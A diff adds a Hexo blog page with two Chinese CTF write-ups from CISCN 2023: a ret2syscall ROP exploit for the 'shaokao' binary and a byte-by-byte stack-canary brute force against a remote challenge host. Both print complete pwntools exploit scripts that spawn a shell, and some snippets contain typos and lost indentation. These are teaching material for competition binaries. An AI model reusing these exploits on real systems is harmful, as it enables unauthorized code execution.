@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://dinkjun.github.io/page/3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dinkjun.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-shaokao" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/29/shaokao/" class="article-date">
+  <time datetime="2023-05-29T13:29:01.312Z" itemprop="datePublished">2023-05-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/29/shaokao/">shaokao(ciscn2023)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="shaokao-ciscn2023"><a href="#shaokao-ciscn2023" class="headerlink" title="shaokao(ciscn2023)"></a>shaokao(ciscn2023)</h1><h2 id="对于这道题目的定义"><a href="#对于这道题目的定义" class="headerlink" title="对于这道题目的定义"></a>对于这道题目的定义</h2><p>   这是一道ret2syscall类型的题目</p>
+<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><ol>
+<li>可以发现一开始你的钱包余额为233块，买啤酒十块钱一瓶买烤串五块钱一串。<br>ida打开程序我们可以发现有一个vip函数:意思是我们可以花10000块买下整个店。<br><img src="/2023/05/29/shaokao/shaokao.png" alt="Alt text"></li>
+<li>如何买下整个店呢？你可以买啤酒或者炸串的时候在选择负号+数字瓶或者串就能够获得相应的钱了。我们可以用这个方法把整个烧烤摊买下来。</li>
+<li>把烧烤摊买下来之后我们就会发现多出了一个改名的选项，我们选择进入这个选项，这里就是我们进行栈溢出的地方了！！！</li>
+</ol>
+<h2 id="查找gadget、system的地址"><a href="#查找gadget、system的地址" class="headerlink" title="查找gadget、system的地址"></a>查找gadget、system的地址</h2><h2 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;-100000&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;5&quot;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x4e60f0</span></span><br><span class="line">pop_rax_rdx_rbx = <span class="number">0x4a404a</span></span><br><span class="line">#pop_rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x40264f</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x40a67e</span></span><br><span class="line">system_addr = <span class="number">0x402404</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">payload = b<span class="string">&quot;/bin/sh\x00;&quot;</span>+ b<span class="string">&quot;A&quot;</span>*<span class="number">31</span> + <span class="title function_">p64</span>(pop_rax_rdx_rbx) + <span class="title function_">p64</span>(<span class="number">0x3b</span>) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(pop_rdi_ret) + <span class="title function_">p64</span>(binsh_addr) + <span class="title function_">p64</span>(pop_rsi_ret) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(system_addr)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+<p><strong>最后的最后要注意因为我们payload中的/bin/sh是要传递给execve系统调用的参数，然而后面还跟了一大串的垃圾数据(拿来栈溢出的，这不是我们要的参数)，所以我们需要在/bin/sh跟上\x00用来进行截断才行</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="clmh37snb000g14v97ivebrz2" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-canary爆破" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/29/canary%E7%88%86%E7%A0%B4/" class="article-date">
+  <time datetime="2023-05-29T12:54:46.241Z" itemprop="datePublished">2023-05-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/29/canary%E7%88%86%E7%A0%B4/">canary爆破(ciscn2023)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="canary爆破-ciscn2023"><a href="#canary爆破-ciscn2023" class="headerlink" title="canary爆破(ciscn2023)"></a><strong>canary爆破(ciscn2023)</strong></h1><h2 id="先附上exp："><a href="#先附上exp：" class="headerlink" title="先附上exp："></a>先附上exp：</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">#local = <span class="number">1</span></span><br><span class="line">#io = <span class="title function_">process</span>(<span class="string">&quot;./funcanary&quot;</span>)</span><br><span class="line">io = <span class="title function_">remote</span>(<span class="string">&quot;123.57.248.214&quot;</span>,<span class="number">30391</span>)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">7</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">256</span>):</span><br><span class="line">print <span class="string">&quot;the &quot;</span> + <span class="title function_">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="title function_">chr</span>(i)</span><br><span class="line">io.<span class="title function_">send</span>(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="title function_">chr</span>(i))</span><br><span class="line">a = io.<span class="title function_">recvuntil</span>(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> b<span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> <span class="attr">a</span>:</span><br><span class="line">canary += <span class="title function_">chr</span>(i)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + b<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + b<span class="string">&#x27;\x31\x12&#x27;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+<h2 id="exp的解释："><a href="#exp的解释：" class="headerlink" title="exp的解释："></a>exp的解释：</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">256</span>):</span><br><span class="line">        print <span class="string">&quot;the &quot;</span> + <span class="title function_">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="title function_">chr</span>(i)</span><br><span class="line">        io.<span class="title function_">send</span>(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="title function_">chr</span>(i))</span><br><span class="line">        a = io.<span class="title function_">recvuntil</span>(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> <span class="attr">a</span>:</span><br><span class="line">                canary += <span class="title function_">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>使用循环嵌套爆破canary值，外层循环控制尝试的canary值的位数，内层循环枚举canary中每一位可能出现的256种取值情况，将’a’、canary和当前尝试的值构成102字节的payload发送给远程主机并接受返回值，如果返回字符串中包含“have fun”就说明当前尝试的值正确，正确的值添加到canary变量中，并且跳出内层循环。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + b<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + b<span class="string">&#x27;\x31\x12&#x27;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i im <span class="title function_">range</span>(<span class="number">256</span>)</span><br><span class="line">        print <span class="string">&quot;the &quot;</span> + <span class="title function_">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="title function_">chr</span>(i)</span><br><span class="line">        io.<span class="title function_">send</span>(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="title function_">chr</span>(i))</span><br><span class="line">        a = io.<span class="title function_">recvuntil</span>(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> <span class="attr">a</span>:</span><br><span class="line">     canary += <span class="title function_">chr</span>(i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>这部分的代码是对canary的爆破，其中使用了两层for循环来枚举可能的canary值。<br>第一层循环的变量是k，取值范围是0到6，也就是canary可能由7个字节构成（<strong>因为canary最多只有8个字节</strong>）。<br>为什么是7，而不是8呢？因为canary最后一位都是为了填充栈空间而默认为’\x00’，而这个已经在该脚本开头已经定义成了初始值，因此可以省略最后一位的枚举。</li>
+<li>第二层循环的变量是i，取值范围是0到255，也就是枚举了一个字节中可能出现的所有取值情况。为什么要枚举一个字节中的所有可能值呢？因为canary每个字节都是一个字符（包括可打印和不可打印字符），也就是说每个字节可能有256种不同的取值情况。</li>
+<li>然后，在每次循环中，首先将’a’、目前已知的canary值和当前尝试的字符（即对应的ASCII值）拼接成长度为102个字节的payload发送给远程主机，然后接收远程主机的返回值。如果返回字符串中包含“have fun”字符串（即程序顺利执行到结尾，并输出了“have fun”），则说明当前尝试的canary字符正确，将其添加到canary变量中，然后打破内层循环，进行下一轮外层循环。<br>经过这一轮的枚举和爆破，canary变量中按顺序存储了正确的canary的所有字符，可以后续构建完整的payload。</li>
+</ol>
+<p>对于</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + b<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + b<span class="string">&#x27;\x31\x12&#x27;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+<ol>
+<li>在栈溢出攻击中，是通过修改栈上返回地址的值，使得程序执行完当前函数后跳转到指定的地址，从而实现攻击者想要的操作。因此，在构造完整的攻击payload时，需要准备一个指定的返回地址，以便程序执行完当前函数后跳转到攻击者指定的代码地址。<ol>
+<li>例如，在这个脚本中，使用8个字节的’A’来填充在canary后面的8个字节，然后再填充一个有意义的返回地址”b’\x31\x12’”，这是在示例代码中手动指定的一个地址，用来保证程序执行到特定的功能代码后跳转回这个地址，从而执行攻击者指定的操作（例如获得程序的shell）。</li>
+</ol>
+</li>
+<li>因此，可以看到payload的构造是这样的：’A’ * 104：填充104个’A’来占位，其中前104个字节是在尝试枚举canary值时所用到的，在实际攻击中这104个字节应该是利用栈溢出漏洞写入的恶意代码。<br>canary：通过canary爆破的结果，来填充正确的canary值。</li>
+</ol>
+<p><strong>‘A’ * 8：这里填充8个’A’的作用是为了将下一个值对齐到8字节（因为栈是按照8字节对齐来维护的），以便能够准确地修改程序执行完当前函数时的返回地址。</strong><br>b’\x31\x12’：手动指定的一个返回地址，用于保证程序执行特定的功能代码后跳转回这个地址，从而执行攻击者指定的操作（例如获得程序的shell）。</p>
+<ol>
+<li>最后，用io.send(payload)将构造好的payload发送给远程主机，然后使用io.interactive()交互式地与控制终端交互，以便利用已经构造好的payload获取程序的shell。  </li>
+</ol>
+<p><strong>注意b”\x31\x12”转化成十六进制就是0x1231即使我们在程序中要返回的地址。</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="clmh37snb000f14v9hmfz6087" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/">scanf函数漏洞的利用及&lt;vfprintf&gt;如何解决</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/08/%E9%9D%99%E6%80%81rop4%E8%BF%9E-fini-array%E6%9E%84%E9%80%A0rop%E9%93%BE/">静态rop4连:fini_array构造rop链</a>
+          </li>
+        
+          <li>
+            <a href="/2023/09/05/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">整数溢出</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/12/one-gadget/">one_gadget</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/09/%E6%9E%84%E9%80%A0python%E8%84%9A%E6%9C%AC%E7%9A%84%E5%93%AA%E4%BA%9B%E4%BA%8B/">构造python脚本的哪些事</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
